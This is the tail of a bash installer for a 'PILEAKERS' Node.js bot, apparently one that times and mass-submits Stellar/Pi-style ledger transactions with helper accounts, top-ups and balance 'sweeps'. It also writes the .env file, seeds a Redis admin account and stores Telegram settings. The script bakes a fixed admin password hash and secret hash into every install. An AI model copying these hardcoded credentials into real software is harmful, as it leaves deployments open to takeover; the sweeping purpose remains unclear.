  ...(pm2MemoryRestart ? { max_memory_restart: pm2MemoryRestart } : {}),
};

const helpersPerWorker = boundedIntEnv('HELPERS_PER_WORKER', 100, 1, 1000);

const workerRateLimitEnv = {
  LOAD_BEFORE_MS: boundedIntEnv('LOAD_BEFORE_MS', 180000, 1000, 600000),
  BUILD_AFTER_LOAD: process.env.BUILD_AFTER_LOAD || 'false',
  BUILD_BEFORE_MS: boundedIntEnv('BUILD_BEFORE_MS', 180000, 1000, 600000),
  SUBMIT_BEFORE_MS: boundedIntEnv('SUBMIT_BEFORE_MS', 3000, 0, 60000),
  SUBMIT_CONCURRENCY: boundedIntEnv('SUBMIT_CONCURRENCY', helpersPerWorker, 1, 1000),
  SUBMIT_WAVE_COUNT: boundedIntEnv('SUBMIT_WAVE_COUNT', 1, 1, 5),
  SUBMIT_WAVE_DELAY_MS: boundedIntEnv('SUBMIT_WAVE_DELAY_MS', 0, 0, 10000),
  SUBMIT_ENDPOINT_MODE: process.env.SUBMIT_ENDPOINT_MODE || 'async',
  SUBMIT_HTTP_MAX_SOCKETS: boundedIntEnv('SUBMIT_HTTP_MAX_SOCKETS', 1500, 1, 5000),
  SUBMIT_HTTP_MAX_FREE_SOCKETS: boundedIntEnv('SUBMIT_HTTP_MAX_FREE_SOCKETS', 256, 1, 2000),
  SUBMIT_HTTP_TIMEOUT_MS: boundedIntEnv('SUBMIT_HTTP_TIMEOUT_MS', 15000, 500, 60000),
  TRANSACTION_TIMEOUT_MS: boundedIntEnv('TRANSACTION_TIMEOUT_MS', 60000, 1000, 600000),
  SEQUENCE_MANAGER_ENABLED: process.env.SEQUENCE_MANAGER_ENABLED || 'true',
  SEQUENCE_RESERVATION_TTL_MS: boundedIntEnv('SEQUENCE_RESERVATION_TTL_MS', 900000, 60000, 86400000),
  SUBMIT_VERBOSE_LOGS: process.env.SUBMIT_VERBOSE_LOGS || 'false',
  SYNC_VERBOSE_LOGS: process.env.SYNC_VERBOSE_LOGS || 'false',
  FAST_TICK_MS: boundedIntEnv('FAST_TICK_MS', 1, 1, 1000),
  HORIZON_PING_TIMEOUT_MS: 5000,
  HORIZON_REQUEST_DELAY_MS: boundedIntEnv('HORIZON_REQUEST_DELAY_MS', 150, 0, 5000),
  HORIZON_RATE_LIMIT_COOLDOWN_MS: 20000,
  HORIZON_RATE_LIMIT_JITTER_MS: 500,
  WORKER_SERVER_ONLY: process.env.WORKER_SERVER_ONLY || 'true',
  MAX_SUBMIT_HORIZONS: unlimitedHorizonEnv('MAX_SUBMIT_HORIZONS', '1'),
  HELPER_LOAD_CONCURRENCY: 5,
  HELPER_LOAD_RETRY_COUNT: 5,
  HELPER_LOAD_RETRY_DELAY_MS: 1000,
  TOPUP_CHECK_CONCURRENCY: 2,
  TOPUP_BASE_BALANCE: '1.0',
  TOPUP_BATCH_SIZE: boundedIntEnv('TOPUP_BATCH_SIZE', 100, 1, 100),
  TOPUP_BATCH_DELAY_MS: 5000,
  SWEEP_BATCH_SIZE: 15,
  SWEEP_BATCH_DELAY_MS: 5000,
  SWEEP_RETRY_COUNT: 3,
  SWEEP_RETRY_DELAY_MS: 5000,
  SWEEP_CONCURRENCY: boundedIntEnv('SWEEP_CONCURRENCY', 15, 1, 15),
  SWEEP_RESERVE_BALANCE: '0.99',
};

module.exports = {
  apps: [
    {
      name: 'dashboard',
      script: 'app.js',
      instances: 1,
      ...pm2ProcessGuard,
      env: {
        NODE_ENV: 'production',
        PORT: 3000,
        SUPPRESS_SYNC_LOGS: process.env.SUPPRESS_SYNC_LOGS || 'true',
      },
    },

    {
      name: 'worker-1',
      script: 'index.js',
      args: 'Worker1',
      instances: 1,
      ...pm2ProcessGuard,
      env: {
        NODE_ENV: 'production',
        WORKER_NAME: 'Worker1',
        WORKER_PORT: 3001,
        WEB_SERVICE_URL: process.env.WEB_SERVICE_URL || '__PILEAKERS_WEB_SERVICE_URL__',
        HELPERS_PER_WORKER: helpersPerWorker,
        WORKER_SERVER_ONLY: 'true',
        MAX_SUBMIT_HORIZONS: unlimitedHorizonEnv('MAX_SUBMIT_HORIZONS', '1'),
        ...workerRateLimitEnv,
        TOPUP_RETRY_COUNT: 5,
        TOPUP_RETRY_DELAY_MS: 5000,
        TOPUP_LOCK_WAIT_MS: 120000,
        TOPUP_LOCK_TTL_MS: 180000,
        TOPUP_LOCK_RETRY_DELAY_MS: 1000,
      },
    },

    {
      name: 'worker-2',
      script: 'index.js',
      args: 'Worker2',
      instances: 1,
      ...pm2ProcessGuard,
      env: {
        NODE_ENV: 'production',
        WORKER_NAME: 'Worker2',
        WORKER_PORT: 3002,
        WEB_SERVICE_URL: process.env.WEB_SERVICE_URL || '__PILEAKERS_WEB_SERVICE_URL__',
        HELPERS_PER_WORKER: helpersPerWorker,
        WORKER_SERVER_ONLY: 'true',
        MAX_SUBMIT_HORIZONS: unlimitedHorizonEnv('MAX_SUBMIT_HORIZONS', '1'),
        ...workerRateLimitEnv,
        TOPUP_RETRY_COUNT: 5,
        TOPUP_RETRY_DELAY_MS: 5000,
        TOPUP_LOCK_WAIT_MS: 120000,
        TOPUP_LOCK_TTL_MS: 180000,
        TOPUP_LOCK_RETRY_DELAY_MS: 1000,
      },
    },

    {
      name: 'worker-3',
      script: 'index.js',
      args: 'Worker3',
      instances: 1,
      ...pm2ProcessGuard,
      env: {
        NODE_ENV: 'production',
        WORKER_NAME: 'Worker3',
        WORKER_PORT: 3003,
        WEB_SERVICE_URL: process.env.WEB_SERVICE_URL || '__PILEAKERS_WEB_SERVICE_URL__',
        HELPERS_PER_WORKER: helpersPerWorker,
        WORKER_SERVER_ONLY: 'true',
        MAX_SUBMIT_HORIZONS: unlimitedHorizonEnv('MAX_SUBMIT_HORIZONS', '1'),
        ...workerRateLimitEnv,
        TOPUP_RETRY_COUNT: 5,
        TOPUP_RETRY_DELAY_MS: 5000,
        TOPUP_LOCK_WAIT_MS: 120000,
        TOPUP_LOCK_TTL_MS: 180000,
        TOPUP_LOCK_RETRY_DELAY_MS: 1000,
      },
    },

    {
      name: 'worker-4',
      script: 'index.js',
      args: 'Worker4',
      instances: 1,
      ...pm2ProcessGuard,
      env: {
        NODE_ENV: 'production',
        WORKER_NAME: 'Worker4',
        WORKER_PORT: 3004,
        WEB_SERVICE_URL: process.env.WEB_SERVICE_URL || '__PILEAKERS_WEB_SERVICE_URL__',
        HELPERS_PER_WORKER: helpersPerWorker,
        WORKER_SERVER_ONLY: 'true',
        MAX_SUBMIT_HORIZONS: unlimitedHorizonEnv('MAX_SUBMIT_HORIZONS', '1'),
        ...workerRateLimitEnv,
        TOPUP_RETRY_COUNT: 5,
        TOPUP_RETRY_DELAY_MS: 5000,
        TOPUP_LOCK_WAIT_MS: 120000,
        TOPUP_LOCK_TTL_MS: 180000,
        TOPUP_LOCK_RETRY_DELAY_MS: 1000,
      },
    },

    {
      name: 'worker-5',
      script: 'index.js',
      args: 'Worker5',
      instances: 1,
      ...pm2ProcessGuard,
      env: {
        NODE_ENV: 'production',
        WORKER_NAME: 'Worker5',
        WORKER_PORT: 3005,
        WEB_SERVICE_URL: process.env.WEB_SERVICE_URL || '__PILEAKERS_WEB_SERVICE_URL__',
        HELPERS_PER_WORKER: helpersPerWorker,
        WORKER_SERVER_ONLY: 'true',
        MAX_SUBMIT_HORIZONS: unlimitedHorizonEnv('MAX_SUBMIT_HORIZONS', '1'),
        ...workerRateLimitEnv,
        TOPUP_RETRY_COUNT: 5,
        TOPUP_RETRY_DELAY_MS: 5000,
        TOPUP_LOCK_WAIT_MS: 120000,
        TOPUP_LOCK_TTL_MS: 180000,
        TOPUP_LOCK_RETRY_DELAY_MS: 1000,
      },
    },
  ],
};
PILEAKERS_ECOSYSTEM_CONFIG_JS
  replace_placeholder "$ECOSYSTEM_FILE" "__PILEAKERS_WEB_SERVICE_URL__" "$WEB_SERVICE_URL"

  success "File app.js, ledger.html, ledger.js, bump.txt, ecosystem.config.js, index.html, index.js, dan package.json selesai dibuat."
}

install_node_modules() {
  section "Install node modules"

  npm install
  success "Node modules selesai diinstall."
}

create_env_file() {
  section "Create .env file"

  backup_file "$ENV_FILE"

  local multisig_pending_secret=""
  local multisig_pending_secret_old=""
  local multisig_pending_secret_history=""
  if [[ -f "$ENV_FILE" ]]; then
    multisig_pending_secret="$(grep -E '^MULTISIG_PENDING_SECRET=' "$ENV_FILE" | tail -n 1 | cut -d= -f2- || true)"
    multisig_pending_secret_old="$(grep -E '^MULTISIG_PENDING_SECRET_OLD=' "$ENV_FILE" | tail -n 1 | cut -d= -f2- || true)"
    multisig_pending_secret_history="$(grep -E '^MULTISIG_PENDING_SECRET_HISTORY=' "$ENV_FILE" | tail -n 1 | cut -d= -f2- || true)"
    if [[ -z "$multisig_pending_secret" ]]; then
      # Versi lama mengenkripsi pending/saved multisig memakai PASSWORD_HASH_C sebagai fallback.
      # Pakai nilai lama ini supaya data Redis yang sudah tersimpan tetap bisa didekripsi setelah update.
      multisig_pending_secret="$(grep -E '^PASSWORD_HASH_C=' "$ENV_FILE" | tail -n 1 | cut -d= -f2- || true)"
    fi
  fi
  if [[ -z "$multisig_pending_secret" ]]; then
    multisig_pending_secret="$(node -e 'process.stdout.write(require("crypto").randomBytes(32).toString("hex"))')"
  fi

  cat > "$ENV_FILE" <<'EOF'
PORT=3000
WEB_SERVICE_URL=__PILEAKERS_WEB_SERVICE_URL__
WEB_SERVICE_TIMEOUT_MS=3000
WEB_SERVICE_RETRY_COUNT=2
WEB_SERVICE_RETRY_DELAY_MS=500
LOG_SEND_FAILURE_REPORT_INTERVAL_MS=60000
SUPPRESS_SYNC_LOGS=true
# Redis diamankan lewat Unix socket lokal supaya tidak perlu menyimpan password Redis di .env.
REDIS_SOCKET=__PILEAKERS_REDIS_SOCKET__
REDIS_HOST=
REDIS_PORT=
REDIS_DB=0
REDIS_USERNAME=
REDIS_PASSWORD=
REDIS_URL=
WORKER_NAME=Worker1
WORKER_PORT=3001
PM2_WORKER_PORT_BASE=3001
PM2_WORKER_NAME_PREFIX=worker-
PM2_AUTO_SAVE=true
HELPERS_PER_WORKER=100
WORKER_SERVER_ONLY=true
LOAD_BEFORE_MS=180000
# true = setelah helper load, langsung build/sign dan simpan signed XDR di memory.
# false = build/sign menunggu BUILD_BEFORE_MS seperti mode lama.
BUILD_AFTER_LOAD=false
BUILD_BEFORE_MS=180000
SUBMIT_BEFORE_MS=3000
SUBMIT_CONCURRENCY=100
SUBMIT_WAVE_COUNT=1
SUBMIT_WAVE_DELAY_MS=0
# sync = seperti Python stellar_sdk Server.submit_transaction() -> /transactions
# async = /transactions_async, hanya accepted/pending lalu diverifikasi ke ledger
SUBMIT_ENDPOINT_MODE=async
# Pool koneksi submit shared per worker, padanan requests.Session + HTTPAdapter Python
SUBMIT_HTTP_MAX_SOCKETS=1500
SUBMIT_HTTP_MAX_FREE_SOCKETS=256
SUBMIT_HTTP_TIMEOUT_MS=15000
# WIN engine: max_time = target call submit + timeout ini.
TRANSACTION_TIMEOUT_MS=60000
# true = worker mengunci helper/sequence per bot supaya job terjadwal tidak memakai helper yang sama.
SEQUENCE_MANAGER_ENABLED=true
SEQUENCE_RESERVATION_TTL_MS=900000
SUBMIT_VERBOSE_LOGS=false
CLASSIC_SUBMIT_TO_ALL_HORIZONS=false
CLASSIC_SUBMIT_LOG_EACH_TX=false
SYNC_VERBOSE_LOGS=false
FAST_TICK_MS=1
HORIZON_PING_TIMEOUT_MS=5000
HORIZON_REQUEST_DELAY_MS=150
HORIZON_RATE_LIMIT_COOLDOWN_MS=20000
HORIZON_RATE_LIMIT_JITTER_MS=500
# 1 = satu server Horizon untuk 100 TX per worker. 0 = unlimited.
MAX_SUBMIT_HORIZONS=1
HELPER_LOAD_CONCURRENCY=5
HELPER_LOAD_RETRY_COUNT=5
HELPER_LOAD_RETRY_DELAY_MS=1000
TOPUP_RETRY_COUNT=5
TOPUP_RETRY_DELAY_MS=5000
TOPUP_LOCK_WAIT_MS=120000
TOPUP_LOCK_TTL_MS=180000
TOPUP_LOCK_RETRY_DELAY_MS=1000
TOPUP_CHECK_CONCURRENCY=2
TOPUP_BASE_BALANCE=1.0
TOPUP_BATCH_SIZE=100
TOPUP_BATCH_DELAY_MS=5000
SWEEP_BATCH_SIZE=15
SWEEP_BATCH_DELAY_MS=5000
SWEEP_RETRY_COUNT=3
SWEEP_RETRY_DELAY_MS=5000
SWEEP_CONCURRENCY=15
SWEEP_RESERVE_BALANCE=0.99
PASSWORD_RESET_OTP_TTL_MS=300000
PASSWORD_RESET_OTP_MAX_ATTEMPTS=5
PASSWORD_HASH_ITERATIONS=210000
ES_CODE_NODE_SERVER=drachzs
PASSWORD_HASH_C=pbkdf2$sha256$210000$ZiH2yfyM3QwhtezPenE2KA==$6ClkDA8zTNJ3TC35g3Fi4wWiQm1Xqk6DVOWKIDF0T3o=
# Secret stabil untuk enkripsi pending multisig dan Saved Wallet List.
# Jangan diganti setelah wallet disimpan, kecuali siap kehilangan kemampuan decrypt data lama.
MULTISIG_PENDING_SECRET=__PILEAKERS_MULTISIG_PENDING_SECRET__
# Optional: isi dengan secret lama dari backup .env jika data Saved Wallet/Watch lama tidak bisa dibaca.
MULTISIG_PENDING_SECRET_OLD=__PILEAKERS_MULTISIG_PENDING_SECRET_OLD__
# Optional: bisa isi banyak secret lama, pisahkan dengan koma/semicolon/pipe.
MULTISIG_PENDING_SECRET_HISTORY=__PILEAKERS_MULTISIG_PENDING_SECRET_HISTORY__
# Watch signer default 1 menit sekali.
MULTISIG_SIGNER_WATCH_INTERVAL_MS=60000
SOER_EMAIL=admin@local
ALLOW_INSECURE_TLS=false
# External Ledger Scanner API untuk tombol Telegram Check Ledger.
# Jangan isi PI_LEDGER_API_URL dengan URL ini, karena PI_LEDGER_API_URL tetap dipakai untuk Horizon /accounts, /transactions, dan /operations.
LEDGER_SCANNER_API_URL=https://ledger.pileakers.net
# 0 = tidak ada batas waktu untuk scan/download ledger.
LEDGER_SCANNER_TIMEOUT_MS=0
# Soft timeout hanya untuk auto-detect range agar tidak stuck jika API scanner tidak membalas.
LEDGER_SCANNER_DETECT_TIMEOUT_MS=20000
TELEGRAM_LEDGER_SCAN_TIMEOUT_MS=0
EOF

  replace_placeholder "$ENV_FILE" "__PILEAKERS_WEB_SERVICE_URL__" "$WEB_SERVICE_URL"
  replace_placeholder "$ENV_FILE" "__PILEAKERS_REDIS_SOCKET__" "$REDIS_SOCKET_PATH"
  replace_placeholder "$ENV_FILE" "__PILEAKERS_MULTISIG_PENDING_SECRET__" "$multisig_pending_secret"
  replace_placeholder "$ENV_FILE" "__PILEAKERS_MULTISIG_PENDING_SECRET_OLD__" "$multisig_pending_secret_old"
  replace_placeholder "$ENV_FILE" "__PILEAKERS_MULTISIG_PENDING_SECRET_HISTORY__" "$multisig_pending_secret_history"
  chmod 600 "$ENV_FILE"
  success "${ENV_FILE} dibuat."
}

seed_redis_admin() {
  section "Set Redis admin user"

  need_command redis-cli
  redis_cli_auth SET "$REDIS_KEY" '[{"id":"admin","username":"admin","password_hash":"pbkdf2$sha256$210000$Rx2y4VSjSQNUrFeGZrTR/Q==$2vvKTa1ZFPPUIBA6PF7v7X30ib6OoYKMWGOwNZXMcUw=","email":"admin@example.com"}]' >/dev/null
  success "Admin user tersimpan di Redis dengan password hash."
}

seed_redis_settings() {
  section "Set Redis Telegram settings"

  need_command redis-cli
  need_command node

  local token="$DEFAULT_TELEGRAM_BOT_TOKEN"
  local chat_id="$DEFAULT_TELEGRAM_CHAT_ID"
  local input=""

  if [[ -t 0 ]]; then
    read -r -p "Telegram bot token [pakai default tersimpan]: " input
    token="${input:-$token}"
    input=""
    read -r -p "Telegram chat id [${chat_id}]: " input
    chat_id="${input:-$chat_id}"
  else
    warn "Terminal non-interaktif, memakai default Telegram settings untuk Redis."
  fi

  local payload
  payload="$(TELEGRAM_BOT_TOKEN="$token" TELEGRAM_CHAT_ID="$chat_id" SUBMIT_BEFORE_MS="${SUBMIT_BEFORE_MS:-2500}" SUBMIT_ENDPOINT_MODE="${SUBMIT_ENDPOINT_MODE:-async}" node -e 'const submitBeforeMs = Number.parseInt(process.env.SUBMIT_BEFORE_MS || "2500", 10); const submitEndpointMode = String(process.env.SUBMIT_ENDPOINT_MODE || "async").trim().toLowerCase() === "sync" ? "sync" : "async"; process.stdout.write(JSON.stringify({telegram_bot_token: process.env.TELEGRAM_BOT_TOKEN || "", telegram_chat_id: process.env.TELEGRAM_CHAT_ID || "", submit_before_ms: Number.isFinite(submitBeforeMs) ? Math.min(Math.max(submitBeforeMs, 0), 60000) : 2500, submit_endpoint_mode: submitEndpointMode, updated_at: new Date().toISOString()}))')"
  redis_cli_auth SET "$REDIS_SETTINGS_KEY" "$payload" >/dev/null
  success "Telegram settings dan Call Submit default tersimpan di Redis key ${REDIS_SETTINGS_KEY}."
}

start_pm2() {
  section "Start app with PM2"

  if [[ ! -f "$ECOSYSTEM_FILE" ]]; then
    fail "File ${ECOSYSTEM_FILE} tidak ditemukan di ${PROJECT_DIR}."
    exit 1
  fi

  pm2 start "$ECOSYSTEM_FILE"
  success "Aplikasi dijalankan lewat PM2."
}

enable_pm2_autostart() {
  section "Enable PM2 auto start"

  "${SUDO[@]}" env PATH="$PATH:/usr/bin" pm2 startup systemd -u "$PM2_USER" --hp "$PM2_HOME"
  pm2 save
  success "PM2 process list disimpan dan akan hidup lagi setelah VPS restart."
}

show_summary() {
  section "Summary"

  pm2 status
  echo
  success "Install selesai."
}

main() {
  banner
  prompt_web_service_url
  install_packages
  prompt_redis_security
  install_pm2
  enable_redis
  configure_redis_security
  create_source_files
  install_node_modules
  create_env_file
  seed_redis_admin
  seed_redis_settings
  start_pm2
  enable_pm2_autostart
  show_summary
}

main "$@"